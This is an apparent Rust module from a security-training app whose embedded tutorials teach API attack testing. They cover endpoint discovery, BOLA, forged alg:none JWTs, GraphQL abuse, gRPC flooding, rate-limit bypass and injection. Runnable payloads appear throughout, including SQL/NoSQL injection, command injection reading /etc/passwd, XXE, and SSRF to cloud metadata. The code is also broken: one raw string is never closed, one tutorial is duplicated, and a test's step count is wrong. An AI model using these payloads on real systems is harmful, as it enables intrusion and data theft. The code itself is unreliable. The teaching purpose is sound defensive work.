/// API Security tutorial phase
///
/// This module provides comprehensive API security tutorials,
/// covering REST APIs, GraphQL, gRPC, authentication, authorization,
/// rate limiting, input validation, and OWASP API Top 10 vulnerabilities.
use crate::model::{QuizStep, Step};
use crate::quiz::parse_question_file;
use std::fs;
use std::path::Path;
use uuid::Uuid;

pub const DOMAIN_API_SECURITY: &str = "API Security";
const QUIZ_FILE_PATH: &str = "data/api_security/api-security-quiz.txt";

pub const API_SECURITY_PHASE: &str = "API Security";

pub const API_SECURITY_STEPS: &[(&str, &str)] = &[
    (
        "API Discovery & Attack Surface Mapping",
        r#"OBJECTIVE: Systematically discover and map API endpoints, GraphQL schemas, and REST API structures to establish comprehensive attack surface visibility.

ACADEMIC BACKGROUND:
Modern web applications rely heavily on APIs for client-server communication. According to OWASP, inadequate API discovery and documentation leads to exposed attack surfaces. API endpoints often contain sensitive business logic and data access patterns that require thorough enumeration.

API Discovery Concepts:
- REST API endpoint patterns (/api/v1/, /rest/, /v2/)
- GraphQL schema introspection and endpoint discovery
- OpenAPI/Swagger documentation enumeration
- API versioning and deprecated endpoint identification
- Subdomain and path-based API discovery

STEP-BY-STEP:

1. ENUMERATE API ENDPOINTS:

   a) Use directory enumeration tools for common API paths:
   ```bash
   # Gobuster for API endpoint discovery
   gobuster dir -u https://api.example.com -w api-endpoints.txt -x json,xml,yaml

   # FFUF for API fuzzing
   ffuf -u https://api.example.com/FUZZ -w api-paths.txt -mc 200,201,401,403
   ```

   b) Test multiple API versions and formats:
   ```bash
   # Test different API versions
   curl -I https://api.example.com/v1/users
   curl -I https://api.example.com/v2/users
   curl -I https://api.example.com/v3/users
   ```

2. DISCOVER GRAPHQL ENDPOINTS:

   a) Test for GraphQL introspection:
   ```bash
   # Basic introspection query
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name}}}"}'
   ```

   b) Extract schema information:
   ```bash
   # Full schema dump (if introspection enabled)
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{...TypeRef}}"}'
   ```

3. LOCATE API DOCUMENTATION:

   a) Search for OpenAPI/Swagger endpoints:
   ```bash
   # Common documentation paths
   curl -I https://api.example.com/swagger.json
   curl -I https://api.example.com/api-docs
   curl -I https://api.example.com/openapi.json
   curl -I https://api.example.com/docs/api
   ```

4. ANALYZE CORS CONFIGURATION:

   a) Test cross-origin access policies:
   ```bash
   # Test CORS preflight
   curl -X OPTIONS https://api.example.com/v1/users \
     -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -v
   ```

WHAT TO LOOK FOR:
- Undocumented API endpoints returning 200 OK responses
- GraphQL introspection returns structured schema data
- OpenAPI documentation exposes sensitive operations
- CORS policies allowing unauthorized origins
- API endpoints on non-standard ports or subdomains
- Deprecated API versions still accessible

COMMON PITFALLS:
- APIs often lack proper authentication requirements
- GraphQL introspection exposes schema information
- CORS misconfigurations enable cross-origin attacks
- API versioning creates inconsistent security controls
- Documentation endpoints reveal implementation details

DETECTION:
- Undocumented API endpoints returning 200 OK responses
- GraphQL introspection returns structured schema data
- OpenAPI documentation exposes sensitive operations
- CORS policies allowing unauthorized origins

REMEDIATION:
- Disable GraphQL introspection in production
- Implement API authentication on all endpoints
- Restrict CORS to specific allowed origins
- Apply consistent rate limiting across API versions

TOOLS AND RESOURCES:
- gobuster with API mode
- ffuf for endpoint fuzzing
- GraphQL introspection queries
- CORS testing tools
    ),
    (
        "OWASP API Top 10 & Authentication Bypass",
        r#"OBJECTIVE: Test for OWASP API Top 10 vulnerabilities including Broken Object Level Authorization (BOLA), Broken Authentication, and Mass Assignment attacks.

ACADEMIC BACKGROUND:
The OWASP API Top 10 represents the most critical API security risks. BOLA (API01:2023) occurs when API endpoints fail to properly authorize access to specific objects. Authentication bypasses and mass assignment vulnerabilities allow attackers to access unauthorized data or escalate privileges.

OWASP API Top 10 Key Risks:
- API01:2023 - Broken Object Level Authorization
- API02:2023 - Broken Authentication
- API03:2023 - Broken Object Property Level Authorization
- API04:2023 - Unrestricted Resource Consumption
- API05:2023 - Broken Function Level Authorization

STEP-BY-STEP:

1. TEST BROKEN OBJECT LEVEL AUTHORIZATION (BOLA):

   a) Extract object IDs from legitimate responses:
   ```bash
   # Get user's own profile
   curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/users/profile
   # Response contains user ID: {"id": 123, "name": "victim"}
   ```

   b) Attempt to access other users' data:
   ```bash
   # Try accessing other user IDs
   curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/users/124
   curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/users/125
   ```

   c) Test sequential ID enumeration:
   ```bash
   # Script to test sequential IDs
   for id in {1..100}; do
     curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/users/$id -w "%{http_code}\n" -s | grep 200
   done
   ```

2. TEST MASS ASSIGNMENT VULNERABILITIES:

   a) Send unexpected parameters in JSON payloads:
   ```bash
   # Normal update request
   curl -X PUT https://api.example.com/v1/users/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Updated Name"}'
   ```

   b) Attempt privilege escalation through mass assignment:
   ```bash
   # Try to escalate privileges
   curl -X PUT https://api.example.com/v1/users/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Hacker","role":"admin","isAdmin":true}'
   ```

3. TEST AUTHENTICATION BYPASS TECHNIQUES:

   a) Test JWT algorithm confusion:
   ```bash
   # Create alg:none token
   echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0
   echo -n '{"user":"admin","role":"admin"}' | base64 -w 0
   echo -n '' | base64 -w 0
   # Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
   ```

   b) Test for weak JWT secrets:
   ```bash
   # Use jwt-cracker or hashcat
   jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... /path/to/wordlist.txt
   ```

WHAT TO LOOK FOR:
- Access to other users' data with 200 OK responses
- Mass assignment accepts privileged parameters
- JWT tokens with alg:none or weak secrets
- Sequential ID patterns allowing enumeration
- Authentication bypass through token manipulation

COMMON PITFALLS:
- APIs trust client-side object IDs without validation
- Mass assignment doesn't whitelist allowed parameters
- JWT secrets are weak or commonly used passwords
- Authentication checks are missing on object access
- Authorization logic is inconsistent across endpoints

DETECTION:
- Access to other users' data with 200 OK responses
- Mass assignment accepts privileged parameters
- JWT tokens with alg:none or weak secrets
- Sequential ID patterns allowing enumeration

REMEDIATION:
- Implement proper object-level authorization checks
- Use whitelists for mass assignment parameters
- Use strong, unique JWT secrets with RS256 algorithm
- Validate all object IDs server-side before access

TOOLS AND RESOURCES:
- jwt_tool for JWT manipulation testing
- sqlmap for API parameter testing
- Burp Suite Intruder for ID enumeration
- Postman for API testing automation"#,
    ),
    (
        "GraphQL Security Testing & Injection",
        r#"OBJECTIVE: Identify GraphQL-specific vulnerabilities including query injection, schema abuse, and denial of service through complex queries.

ACADEMIC BACKGROUND:
GraphQL provides flexible data querying but introduces unique security challenges. Unlike REST APIs, GraphQL allows clients to specify exactly what data they need, but this flexibility can lead to injection attacks, resource exhaustion, and schema exposure.

GraphQL Security Concepts:
- Query injection and parameter manipulation
- Schema introspection and information disclosure
- Query depth and complexity limits
- Field enumeration and hidden data discovery
- Batch query abuse and rate limiting bypass

STEP-BY-STEP:

1. TEST GRAPHQL INTROSPECTION:

   a) Attempt schema extraction:
   ```bash
   # Basic introspection
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{__schema{types{name}}}"}'
   ```

   b) Extract full schema if introspection enabled:
   ```bash
   # Use GraphQL Voyager or similar tools
   # Or manual extraction with complex queries
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{queryType{name}types{kind name fields{name}}}}"}'
   ```

2. TEST QUERY DEPTH ABUSE:

   a) Create deeply nested queries:
   ```bash
   # Test depth limits
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{user{id friends{ id friends{ id friends{ id }}}}}"}'
   ```

   b) Test circular references:
   ```bash
   # Self-referencing queries
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{user{id manager{ id manager{ id }}}}"}'
   ```

3. TEST GRAPHQL INJECTION:

   a) Test argument injection:
   ```bash
   # String concatenation injection
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{user(id:\"1\"){name}}"}'
   ```

   b) Test for SQL injection in resolvers:
   ```bash
   # If backend uses SQL
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{user(id:\"1 OR 1=1\"){name}}"}'
   ```

4. TEST BATCH QUERY ABUSE:

   a) Use aliases for multiple queries:
   ```bash
   # Batch operations
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{user1:user(id:\"1\"){name} user2:user(id:\"2\"){name}}"}'
   ```

5. TEST MUTATION AUTHORIZATION:

   a) Test unauthorized data modification:
   ```bash
   # Attempt privilege escalation
   curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{updateUser(id:\"123\", role:\"admin\"){success}}"}'
   ```

WHAT TO LOOK FOR:
- Schema information exposed through introspection
- Deep queries causing timeouts or high resource usage
- Injection payloads executed successfully
- Batch queries bypassing rate limits
- Unauthorized mutations succeeding

COMMON PITFALLS:
- Introspection enabled in production environments
- No depth/complexity limits on queries
- Insufficient input validation on GraphQL arguments
- Authorization checks missing on mutations
- Error messages revealing implementation details

DETECTION:
- Schema information exposed through introspection
- Deep queries causing timeouts or high resource usage
- Injection payloads executed successfully
- Batch queries bypassing rate limits

REMEDIATION:
- Disable introspection in production environments
- Implement query depth and complexity limits
- Add proper input validation and sanitization
- Implement authorization checks on all mutations

TOOLS AND RESOURCES:
- GraphQL Voyager for schema visualization
- graphql-path-enum for field enumeration
- InQL for GraphQL security testing
- GraphQL Cop for static analysis"#,
    ),
    (
        "gRPC & Protocol Buffer Security",
        r#"OBJECTIVE: Test gRPC services for authentication bypasses, authorization flaws, and Protocol Buffer manipulation vulnerabilities.

ACADEMIC BACKGROUND:
gRPC uses Protocol Buffers for efficient serialization and provides streaming capabilities. However, gRPC services can suffer from authentication bypasses, insecure defaults, and protocol-specific attacks. The binary nature of Protocol Buffers makes testing more challenging but equally important.

gRPC Security Concepts:
- Service reflection and method discovery
- Protocol Buffer message manipulation
- Authentication and authorization bypasses
- TLS configuration weaknesses
- Streaming abuse and resource exhaustion

STEP-BY-STEP:

1. DISCOVER GRPC SERVICES:

   a) Test for gRPC reflection:
   ```bash
   # Use grpcurl for service discovery
   grpcurl -plaintext localhost:50051 list

   # List all services
   grpcurl -plaintext localhost:50051 list svc

   # Get service methods
   grpcurl -plaintext localhost:50051 describe svc.UserService
   ```

   b) Test gRPC-web endpoints:
   ```bash
   # gRPC-web uses HTTP/1.1 with special headers
   curl -X POST https://api.example.com/grpc \
     -H "Content-Type: application/grpc-web" \
     -H "X-Grpc-Web: 1" \
     --data-binary @request.bin
   ```

2. TEST PROTOCOL BUFFER MANIPULATION:

   a) Extract .proto files if available:
   ```bash
   # Look for proto files in source repositories
   find . -name "*.proto" -type f
   ```

   b) Test message field manipulation:
   ```bash
   # Use grpcurl to test malformed messages
   grpcurl -plaintext -d '{"id": "123", "role": "admin"}' \
     localhost:50051 svc.UserService/UpdateProfile
   ```

3. TEST AUTHENTICATION BYPASSES:

   a) Test missing authentication:
   ```bash
   # Try unauthenticated access
   grpcurl -plaintext localhost:50051 svc.UserService/GetProfile
   ```

   b) Test weak token validation:
   ```bash
   # Test JWT in metadata
   grpcurl -plaintext -rpc-header "authorization: Bearer invalid.jwt.here" \
     localhost:50051 svc.UserService/GetProfile
   ```

4. TEST STREAMING ABUSE:

   a) Test bidirectional streaming limits:
   ```bash
   # Use grpcurl for streaming tests
   grpcurl -plaintext -d @ localhost:50051 svc.ChatService/StreamMessages
   ```

   b) Test resource exhaustion:
   ```bash
   # Flood with streaming requests
   for i in {1..100}; do
     grpcurl -plaintext -d '{}' localhost:50051 svc.Service/Method &
   done
   ```

WHAT TO LOOK FOR:
- gRPC reflection enabled in production
- Services accessible without authentication
- Protocol Buffer messages accepting invalid data
- Streaming endpoints vulnerable to abuse
- TLS not properly configured

COMMON PITFALLS:
- gRPC reflection exposes service metadata
- Default insecure configurations used in production
- Authentication tokens not properly validated
- No rate limiting on streaming endpoints
- Error messages reveal sensitive information

DETECTION:
- gRPC reflection enabled in production
- Services accessible without authentication
- Protocol Buffer messages accepting invalid data
- Streaming endpoints vulnerable to abuse

REMEDIATION:
- Disable gRPC reflection in production
- Implement proper authentication and authorization
- Validate Protocol Buffer messages server-side
- Implement rate limiting on streaming endpoints

TOOLS AND RESOURCES:
- grpcurl for gRPC service testing
- grpcui for web-based gRPC testing
- Evans for interactive gRPC client
- Protobuf compiler for message analysis"#,
    ),
    (
        "Rate Limiting & Abuse Prevention",
        r#"OBJECTIVE: Test API rate limiting implementations for bypass opportunities, resource exhaustion, and denial of service vulnerabilities.

ACADEMIC BACKGROUND:
Rate limiting protects APIs from abuse and resource exhaustion. However, poorly implemented rate limiting can be bypassed through various techniques. OWASP API04:2023 (Unrestricted Resource Consumption) highlights the importance of proper rate limiting and resource controls.

Rate Limiting Concepts:
- Request throttling and quota enforcement
- Rate limit bypass techniques (IP rotation, header manipulation)
- Resource exhaustion through expensive operations
- Distributed rate limiting challenges
- Business logic abuse vs. volumetric attacks

STEP-BY-STEP:

1. IDENTIFY RATE LIMITING MECHANISMS:

   a) Test request frequency limits:
   ```bash
   # Burst requests to trigger rate limiting
   for i in {1..100}; do
     curl -X GET https://api.example.com/v1/users -w "%{http_code} " &
   done
   ```

   b) Check rate limit headers:
   ```bash
   # Examine response headers
   curl -I https://api.example.com/v1/users
   # Look for: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset
   ```

2. TEST RATE LIMIT BYPASS TECHNIQUES:

   a) IP rotation and proxy usage:
   ```bash
   # Use different IP addresses
   curl --proxy http://proxy1.example.com:8080 https://api.example.com/v1/users
   curl --proxy http://proxy2.example.com:8080 https://api.example.com/v1/users
   ```

   b) Header manipulation:
   ```bash
   # Try different user agents, referers
   curl -H "User-Agent: Bot/1.0" https://api.example.com/v1/users
   curl -H "Referer: https://evil.com" https://api.example.com/v1/users
   ```

   c) Cookie manipulation:
   ```bash
   # Test cookie-based rate limiting
   curl -H "Cookie: session=abc123" https://api.example.com/v1/users
   curl -H "Cookie: session=def456" https://api.example.com/v1/users
   ```

3. TEST BUSINESS LOGIC ABUSE:

   a) Expensive operation abuse:
   ```bash
   # Operations that consume significant resources
   curl -X POST https://api.example.com/v1/search \
     -d '{"query":"*", "limit": 10000, "sort": "complex"}'
   ```

   b) Algorithmic complexity attacks:
   ```bash
   # Test with computationally expensive inputs
   curl -X POST https://api.example.com/v1/process \
     -d '{"data": "very_long_string" * 1000}'
   ```

4. TEST DISTRIBUTED ATTACKS:

   a) Multi-threaded abuse:
   ```bash
   # Parallel requests from single IP
   seq 1 10 | xargs -n1 -P10 curl -s https://api.example.com/v1/users >/dev/null
   ```

   b) API key rotation:
   ```bash
   # If API keys are used
   curl -H "X-API-Key: key1" https://api.example.com/v1/users
   curl -H "X-API-Key: key2" https://api.example.com/v1/users
   ```

WHAT TO LOOK FOR:
- Rate limit headers revealing limits and reset times
- Bypass techniques successfully evading limits
- Expensive operations not properly restricted
- Distributed attacks overwhelming defenses
- Inconsistent rate limiting across endpoints

COMMON PITFALLS:
- Rate limiting based only on IP addresses
- No protection against distributed attacks
- Expensive operations not rate limited
- Rate limit bypass through header manipulation
- Inconsistent enforcement across API versions

DETECTION:
- Rate limit headers revealing limits and reset times
- Bypass techniques successfully evading limits
- Expensive operations not properly restricted
- Distributed attacks overwhelming defenses

REMEDIATION:
- Implement multi-factor rate limiting (IP + user + endpoint)
- Use distributed rate limiting systems
- Apply rate limits to expensive operations
- Implement consistent rate limiting across all endpoints

TOOLS AND RESOURCES:
- vegeta for load testing and rate limit testing
- hey for HTTP load testing
- siege for stress testing
- wrk for performance testing"#,
    ),
    (
        "Input Validation & Injection Attacks",
        r#"OBJECTIVE: Test API input validation for injection vulnerabilities, parameter manipulation, and data sanitization failures.

ACADEMIC BACKGROUND:
Input validation is critical for API security. Injection attacks (SQL, NoSQL, command injection) occur when untrusted input is processed without proper validation. APIs often accept complex data structures that require thorough validation.

Input Validation Concepts:
- Parameter injection and manipulation
- SQL/NoSQL injection techniques
- Command injection in API processing
- XML external entity (XXE) attacks
- Server-side request forgery (SSRF)
- Template injection vulnerabilities

STEP-BY-STEP:

1. TEST SQL INJECTION:

   a) Test query parameters:
   ```bash
   # Basic SQL injection
   curl "https://api.example.com/v1/users?search=' OR '1'='1"
   curl "https://api.example.com/v1/users?id=1' UNION SELECT * FROM users--"
   ```

   b) Test POST body injection:
   ```bash
   # JSON parameter injection
   curl -X POST https://api.example.com/v1/search \
     -H "Content-Type: application/json" \
     -d '{"query": "admin'\'' OR 1=1 --"}'
   ```

2. TEST NOSQL INJECTION:

   a) MongoDB operator injection:
   ```bash
   # MongoDB query injection
   curl -X POST https://api.example.com/v1/users \
     -H "Content-Type: application/json" \
     -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
   ```

   b) Test for NoSQL blind injection:
   ```bash
   # Time-based injection
   curl -X POST https://api.example.com/v1/auth \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": ".*"}}'
   ```

3. TEST COMMAND INJECTION:

   a) Test system command execution:
   ```bash
   # Command injection in parameters
   curl "https://api.example.com/v1/process?file=../../../etc/passwd"
   curl -X POST https://api.example.com/v1/execute \
     -d 'command=ls; cat /etc/passwd'
   ```

4. TEST SSRF VULNERABILITIES:

   a) URL parameter manipulation:
   ```bash
   # Internal service access
   curl "https://api.example.com/v1/fetch?url=http://localhost:8080/admin"
   curl "https://api.example.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
   ```

   b) Host header injection:
   ```bash
   # Host header SSRF
   curl -H "Host: localhost" https://api.example.com/v1/webhook
   ```

5. TEST TEMPLATE INJECTION:

   a) Test for template engine injection:
   ```bash
   # Template injection attempts
   curl -X POST https://api.example.com/v1/render \
     -d 'template={{7*7}}&data=user_input'
   ```

6. TEST XML/XXE ATTACKS:

   a) Test for XML external entities:
   ```bash
   # XXE payload
   curl -X POST https://api.example.com/v1/xml \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
   ```

WHAT TO LOOK FOR:
- SQL syntax errors or unexpected results
- Authentication bypass through injection
- File system access through command injection
- Internal service access through SSRF
- Template execution in user input
- External entity resolution in XML

COMMON PITFALLS:
- Input validation only on client-side
- Blacklist-based filtering instead of whitelist
- Missing parameterized queries
- Trusting user-controlled URLs
- No XML parser security configuration
- Insufficient error handling revealing injection success

DETECTION:
- SQL syntax errors or unexpected results
- Authentication bypass through injection
- File system access through command injection
- Internal service access through SSRF

REMEDIATION:
- Implement server-side input validation with whitelists
- Use parameterized queries and prepared statements
- Validate and sanitize all user-controlled URLs
- Disable external entity processing in XML parsers

TOOLS AND RESOURCES:
- sqlmap for SQL injection testing
- nosqlmap for NoSQL injection testing
- ssrfmap for SSRF vulnerability testing
- Burp Suite for comprehensive injection testing"#,
    ),
    (
        "Input Validation & Injection Attacks",
        r##"OBJECTIVE: Test API input validation for injection vulnerabilities, parameter manipulation, and data sanitization failures.

ACADEMIC BACKGROUND:
Input validation is critical for API security. Injection attacks (SQL, NoSQL, command injection) occur when untrusted input is processed without proper validation. APIs often accept complex data structures that require thorough validation.

Input Validation Concepts:
- Parameter injection and manipulation
- SQL/NoSQL injection techniques
- Command injection in API processing
- XML external entity (XXE) attacks
- Server-side request forgery (SSRF)
- Template injection vulnerabilities

STEP-BY-STEP:

1. TEST SQL INJECTION:

   a) Test query parameters:
   ```bash
   # Basic SQL injection
   curl "https://api.example.com/v1/users?search=' OR '1'='1"
   curl "https://api.example.com/v1/users?id=1' UNION SELECT * FROM users--"
   ```

   b) Test POST body injection:
   ```bash
   # JSON parameter injection
   curl -X POST https://api.example.com/v1/search \
     -H "Content-Type: application/json" \
     -d '{"query": "admin'\'' OR 1=1 --"}'
   ```

2. TEST NOSQL INJECTION:

   a) MongoDB operator injection:
   ```bash
   # MongoDB query injection
   curl -X POST https://api.example.com/v1/users \
     -H "Content-Type: application/json" \
     -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
   ```

   b) Test for NoSQL blind injection:
   ```bash
   # Time-based injection
   curl -X POST https://api.example.com/v1/auth \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": ".*"}}'
   ```

3. TEST COMMAND INJECTION:

   a) Test system command execution:
   ```bash
   # Command injection in parameters
   curl "https://api.example.com/v1/process?file=../../../etc/passwd"
   curl -X POST https://api.example.com/v1/execute \
     -d 'command=ls; cat /etc/passwd'
   ```

4. TEST SSRF VULNERABILITIES:

   a) URL parameter manipulation:
   ```bash
   # Internal service access
   curl "https://api.example.com/v1/fetch?url=http://localhost:8080/admin"
   curl "https://api.example.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
   ```

   b) Host header injection:
   ```bash
   # Host header SSRF
   curl -H "Host: localhost" https://api.example.com/v1/webhook
   ```

5. TEST TEMPLATE INJECTION:

   a) Test for template engine injection:
   ```bash
   # Template injection attempts
   curl -X POST https://api.example.com/v1/render \
     -d 'template={{7*7}}&data=user_input'
   ```

6. TEST XML/XXE ATTACKS:

   a) Test for XML external entities:
   ```bash
   # XXE payload
   curl -X POST https://api.example.com/v1/xml \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
   ```

WHAT TO LOOK FOR:
- SQL syntax errors or unexpected results
- Authentication bypass through injection
- File system access through command injection
- Internal service access through SSRF
- Template execution in user input
- External entity resolution in XML

COMMON PITFALLS:
- Input validation only on client-side
- Blacklist-based filtering instead of whitelist
- Missing parameterized queries
- Trusting user-controlled URLs
- No XML parser security configuration
- Insufficient error handling revealing injection success

DETECTION:
- SQL syntax errors or unexpected results
- Authentication bypass through injection
- File system access through command injection
- Internal service access through SSRF

REMEDIATION:
- Implement server-side input validation with whitelists
- Use parameterized queries and prepared statements
- Validate and sanitize all user-controlled URLs
- Disable external entity processing in XML parsers

TOOLS AND RESOURCES:
- sqlmap for SQL injection testing
- nosqlmap for NoSQL injection testing
- ssrfmap for SSRF vulnerability testing
- Burp Suite for comprehensive injection testing"##,
    ),
];
/// Create API security quiz step from file
pub fn create_api_security_quiz_step() -> Result<Step, Box<dyn std::error::Error>> {
    let path = Path::new(QUIZ_FILE_PATH);
    let content = fs::read_to_string(path)?;
    let questions = parse_question_file(&content)?;

    let quiz_step = QuizStep::new(
        Uuid::new_v4(),
        "API Security Quiz".to_string(),
        DOMAIN_API_SECURITY.to_string(),
        questions,
    );

    Ok(Step::new_quiz(
        Uuid::new_v4(),
        "API Security Quiz".to_string(),
        vec![
            "quiz".to_string(),
            "api".to_string(),
            "security".to_string(),
            "authentication".to_string(),
            "authorization".to_string(),
        ],
        quiz_step,
    ))
}

/// Build API Security steps with quiz
pub fn get_api_security_steps() -> Vec<Step> {
    let mut steps = Vec::new();

    // Add API security tutorial steps
    for (title, description) in API_SECURITY_STEPS.iter() {
        steps.push(Step::new_tutorial(
            Uuid::new_v4(),
            title.to_string(),
            description.to_string(),
            vec![
                "api".to_string(),
                "security".to_string(),
                "rest".to_string(),
                "graphql".to_string(),
                "grpc".to_string(),
            ],
        ));
    }

    // Add quiz step
    match create_api_security_quiz_step() {
        Ok(quiz_step) => steps.push(quiz_step),
        Err(err) => eprintln!("Warning: Failed to load API Security quiz: {err}"),
    }

    steps
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_api_security_quiz_file_exists() {
        let path = Path::new(QUIZ_FILE_PATH);
        assert!(path.exists(), "API security quiz file should exist");
    }

    #[test]
    fn test_api_security_quiz_minimum_questions() {
        let path = Path::new(QUIZ_FILE_PATH);
        let content = fs::read_to_string(path).expect("Should be able to read quiz file");

        let questions = parse_question_file(&content).expect("Should be able to parse quiz file");

        assert!(
            questions.len() >= 15,
            "Quiz should have at least 15 questions, found {}",
            questions.len()
        );
    }

    #[test]
    fn test_get_api_security_steps_returns_steps() {
        let steps = get_api_security_steps();

        // Should have tutorial steps + quiz step
        assert!(
            steps.len() >= 7, // 6 tutorial + 1 quiz
            "Should have at least 7 steps (6 tutorial + 1 quiz), found {}",
            steps.len()
        );
    }

    #[test]
    fn test_quiz_step_creation() {
        let quiz_result = create_api_security_quiz_step();
        assert!(quiz_result.is_ok(), "Quiz step creation should succeed");

        let quiz_step = quiz_result.unwrap();
        match quiz_step.content {
            crate::model::StepContent::Quiz { quiz_data: _ } => {} // Expected
            _ => panic!("Quiz step should have Quiz content"),
        }
    }
}
